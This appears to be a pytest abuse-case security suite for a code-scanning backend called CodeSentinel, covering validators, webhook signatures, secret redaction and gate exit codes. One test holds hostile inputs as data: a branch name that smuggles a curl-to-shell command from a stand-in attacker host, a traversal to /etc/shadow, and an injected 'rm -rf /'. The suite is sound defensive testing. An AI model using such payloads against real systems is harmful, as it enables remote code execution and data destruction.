"""
CodeSentinel — Step 6S-C Unit & Integration Abuse-Case Security Test Suite

Comprehensive abuse-case testing covering:
A. Input boundary abuse (empty inputs, long strings, malicious branch/path characters, invalid PR/SHA).
B. Webhook security abuse (missing/invalid HMAC signature, tampered body, unsupported events).
C. GitHub API abuse (error statuses 401/403/404/429/500, token non-leakage).
D. Security report & gate abuse (malformed schemas, negative counts, contradictory decisions, fail-closed exit codes).
E. Configuration abuse (production debug mode, invalid ports, secret masking).
F. Static non-execution attack testing (hostile fixtures with marker side-effects, verifying ZERO execution).
G. Secret-leak prevention across errors, logs, and CI summary generation.
"""

import hmac
import hashlib
import json
import logging
import os
import sys
import pytest
from pathlib import Path
from fastapi.testclient import TestClient

# Ensure backend and workspace root directory are in sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "backend")))
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from backend.app.main import app
from backend.app.core.config import Settings, settings
from backend.app.core.security import (
    sanitize_sensitive_text,
    SecurityLogFilter,
    RequestSizeLimitMiddleware
)
from backend.repository.validator import (
    validate_github_url,
    validate_branch,
    validate_repo_path
)
from backend.github.validator import (
    validate_webhook_owner,
    validate_webhook_repo,
    validate_pr_number,
    validate_commit_sha
)
from backend.github.webhook import verify_github_webhook_signature
from backend.github.exceptions import (
    GitHubAPIError,
    GitHubAuthenticationError,
    GitHubPermissionError,
    GitHubNotFoundError,
    GitHubRateLimitError
)
from backend.analysis.security_gate import (
    validate_security_report,
    evaluate_security_gate,
    run_security_gate
)
from backend.analysis.ci_report import generate_ci_security_summary
from backend.analysis.security_scan import run_security_scan

client = TestClient(app)


# ==============================================================================
# SECTION A: INPUT BOUNDARY ABUSE
# ==============================================================================

def test_input_boundary_empty_and_null_inputs():
    """A1. Verifies that empty, null, or invalid type inputs raise ValueError."""
    with pytest.raises(ValueError):
        validate_github_url("")

    with pytest.raises(ValueError):
        validate_github_url("   ")

    with pytest.raises(ValueError):
        validate_branch(None)  # type: ignore

    with pytest.raises(ValueError):
        validate_repo_path(12345)  # type: ignore


def test_input_boundary_malicious_characters_and_path_traversal():
    """A2. Verifies rejection of shell injection and path traversal attempts."""
    # Shell injection in branch name
    with pytest.raises(ValueError):
        validate_branch("main; curl http://attacker.com/steal | sh")

    # Path traversal in repo path
    with pytest.raises(ValueError):
        validate_repo_path("../../../etc/shadow")

    # Command injection in repo path
    with pytest.raises(ValueError):
        validate_repo_path("src/app`rm -rf /`")

    # Invalid GitHub URL scheme / userinfo
    with pytest.raises(ValueError):
        validate_github_url("http://github.com/owner/repo")  # Insecure HTTP

    with pytest.raises(ValueError):
        validate_github_url("https://admin:password@github.com/owner/repo")  # Userinfo credential in URL


def test_input_boundary_invalid_pr_and_sha_formats():
    """A3. Verifies validation of PR numbers and commit SHAs."""
    with pytest.raises(ValueError):
        validate_pr_number(-10)

    with pytest.raises(ValueError):
        validate_pr_number(0)

    with pytest.raises(ValueError):
        validate_commit_sha("short")

    with pytest.raises(ValueError):
        validate_commit_sha("g" * 40)  # Invalid non-hex char 'g'


# ==============================================================================
# SECTION B: WEBHOOK SECURITY ABUSE
# ==============================================================================

def test_webhook_missing_or_invalid_signature():
    """B1. Verifies webhook endpoints reject requests missing or using invalid signatures."""
    secret = "test_webhook_secret_key_123"
    payload_bytes = b'{"action": "opened"}'

    # Missing signature header
    assert not verify_github_webhook_signature(
        payload=payload_bytes,
        signature_header=None,
        secret=secret
    )

    # Invalid signature format (not starting with sha256=)
    assert not verify_github_webhook_signature(
        payload=payload_bytes,
        signature_header="invalid_sig_format",
        secret=secret
    )

    # Tampered payload after signature generation
    hex_sig = hmac.new(secret.encode("utf-8"), payload_bytes, hashlib.sha256).hexdigest()
    valid_sig_header = f"sha256={hex_sig}"
    tampered_bytes = b'{"action": "opened", "malicious": true}'

    assert not verify_github_webhook_signature(
        payload=tampered_bytes,
        signature_header=valid_sig_header,
        secret=secret
    )

    # Valid payload + valid signature header -> True
    assert verify_github_webhook_signature(
        payload=payload_bytes,
        signature_header=valid_sig_header,
        secret=secret
    )


def test_webhook_endpoint_unsupported_event_rejection():
    """B2. Verifies API endpoint rejects unsupported webhook events cleanly."""
    res = client.post(
        "/github/webhook",
        headers={
            "X-GitHub-Event": "ping",
            "X-GitHub-Delivery": "deliv-12345"
        },
        json={"zen": "Non-interactive test"}
    )
    assert res.status_code == 200
    assert res.json().get("status") == "ignored"


# ==============================================================================
# SECTION C: GITHUB API ABUSE & EXCEPTION HARDENING
# ==============================================================================

def test_github_api_typed_exceptions_do_not_leak_tokens():
    """C1. Verifies typed GitHub API exceptions contain safe message text without secret tokens."""
    token = "ghp_1234567890abcdef1234567890abcdef"
    err = GitHubAuthenticationError(f"Authentication failed for user with token {token}")

    raw_str = str(err)
    safe_str = sanitize_sensitive_text(raw_str)

    assert token not in safe_str
    assert "[REDACTED_SECRET]" in safe_str
    assert err.status_code == 401


# ==============================================================================
# SECTION D: SECURITY REPORT & GATE ABUSE
# ==============================================================================

def test_security_report_schema_validation_abuse():
    """D1. Verifies validate_security_report catches all malformed, negative, or boolean schema fields."""
    # Not a dict
    valid, msg, _ = validate_security_report("not_a_dict")
    assert not valid

    # Failed status
    valid, msg, _ = validate_security_report({"status": "error"})
    assert not valid

    # Invalid review_status
    valid, msg, _ = validate_security_report({"status": "success", "review_status": "invalid_status"})
    assert not valid

    # Missing summary
    valid, msg, _ = validate_security_report({"status": "success", "review_status": "allow"})
    assert not valid

    # Negative count
    bad_summary = {
        "status": "success",
        "review_status": "allow",
        "summary": {
            "critical_count": -1,
            "high_count": 0,
            "medium_count": 0,
            "low_count": 0,
            "info_count": 0
        }
    }
    valid, msg, _ = validate_security_report(bad_summary)
    assert not valid
    assert "cannot be negative" in msg

    # Boolean count (True is int in python, must be rejected)
    bool_summary = {
        "status": "success",
        "review_status": "allow",
        "summary": {
            "critical_count": True,
            "high_count": 0,
            "medium_count": 0,
            "low_count": 0,
            "info_count": 0
        }
    }
    valid, msg, _ = validate_security_report(bool_summary)
    assert not valid
    assert "must be an integer" in msg


def test_security_gate_deterministic_exit_codes_and_contradiction_checks():
    """D2. Verifies security gate deterministic exit codes (ALLOW=0, REVIEW=2, BLOCK=1, INVALID=1)."""
    # ALLOW -> exit 0
    allow_report = {
        "status": "success",
        "review_status": "allow",
        "summary": {"critical_count": 0, "high_count": 0, "medium_count": 0, "low_count": 1, "info_count": 2}
    }
    dec, code, _ = evaluate_security_gate(allow_report)
    assert dec == "ALLOW"
    assert code == 0

    # REVIEW -> exit 2
    review_report = {
        "status": "success",
        "review_status": "review",
        "summary": {"critical_count": 0, "high_count": 0, "medium_count": 3, "low_count": 0, "info_count": 0}
    }
    dec, code, _ = evaluate_security_gate(review_report)
    assert dec == "REVIEW"
    assert code == 2

    # BLOCK -> exit 1
    block_report = {
        "status": "success",
        "review_status": "block",
        "summary": {"critical_count": 1, "high_count": 2, "medium_count": 0, "low_count": 0, "info_count": 0}
    }
    dec, code, _ = evaluate_security_gate(block_report)
    assert dec == "BLOCK"
    assert code == 1

    # Contradictory report (review_status='allow' but high_count=1) -> INVALID (exit 1)
    contradictory_report = {
        "status": "success",
        "review_status": "allow",
        "summary": {"critical_count": 0, "high_count": 1, "medium_count": 0, "low_count": 0, "info_count": 0}
    }
    dec, code, msg = evaluate_security_gate(contradictory_report)
    assert dec == "INVALID"
    assert code == 1
    assert "contradicts computed decision" in msg


def test_security_gate_missing_or_invalid_file(tmp_path):
    """D3. Verifies run_security_gate fails safely on non-existent or unparseable files."""
    assert run_security_gate(str(tmp_path / "non_existent.json")) == 1

    bad_json_file = tmp_path / "bad.json"
    bad_json_file.write_text("{unparseable json", encoding="utf-8")
    assert run_security_gate(str(bad_json_file)) == 1


# ==============================================================================
# SECTION E: CONFIGURATION ABUSE
# ==============================================================================

def test_configuration_abuse_validation():
    """E1. Verifies validation of invalid environment configurations."""
    # Production with debug=True
    s1 = Settings(APP_ENV="production", DEBUG=True)
    valid, errs = s1.validate_security_configuration()
    assert not valid
    assert any("DEBUG mode must be False" in e for e in errs)

    # Invalid port 0
    s2 = Settings(BACKEND_PORT=0)
    valid, errs = s2.validate_security_configuration()
    assert not valid
    assert any("BACKEND_PORT" in e for e in errs)


# ==============================================================================
# SECTION F: STATIC NON-EXECUTION ATTACK TESTING
# ==============================================================================

def test_static_non_execution_hostile_fixtures(tmp_path):
    """
    F1. Hostile Static Analysis Test:
    Creates untrusted files attempting os.system, subprocess calls, network exfiltration,
    and file deletion. Asserts static scan completes without executing target files.
    """
    target_dir = tmp_path / "hostile_repo"
    target_dir.mkdir()

    marker_file = target_dir / "HACKED_MARKER.txt"

    # Hostile Python script that attempts to write a marker file
    hostile_py = target_dir / "malicious.py"
    hostile_py.write_text(
        f"import os\nos.system('echo HACKED > {marker_file.as_posix()}')\n",
        encoding="utf-8"
    )

    # Hostile setup.py script
    setup_py = target_dir / "setup.py"
    setup_py.write_text(
        f"import pathlib\npathlib.Path(r'{marker_file.as_posix()}').write_text('SETUP_EXECUTED')\n",
        encoding="utf-8"
    )

    # Run static security scan on hostile repository
    report = run_security_scan(target_dir=str(target_dir))
    assert isinstance(report, dict)
    assert report.get("status") == "success"

    # Assert marker file was NEVER created
    assert not marker_file.exists(), (
        "CRITICAL SECURITY FAILURE: Hostile code in target repository was executed!"
    )


# ==============================================================================
# SECTION G: SECRET-LEAK TESTING ACROSS LOGS AND REPORTS
# ==============================================================================

def test_secret_leak_prevention_in_ci_summary():
    """G1. Verifies that generate_ci_security_summary excludes secrets and source code."""
    token = "ghp_1234567890abcdef1234567890abcdef"
    report = {
        "status": "success",
        "review_status": "allow",
        "analysis_id": f"anls-{token}",
        "summary": {"total_findings": 0, "critical_count": 0, "high_count": 0, "medium_count": 0, "low_count": 0, "info_count": 0}
    }

    summary_md = generate_ci_security_summary(report, "owner/repo", "main")
    sanitized_md = sanitize_sensitive_text(summary_md)

    assert token not in sanitized_md
    assert "[REDACTED_SECRET]" in sanitized_md
    assert "<!-- codesentinel-security-analysis -->" in summary_md
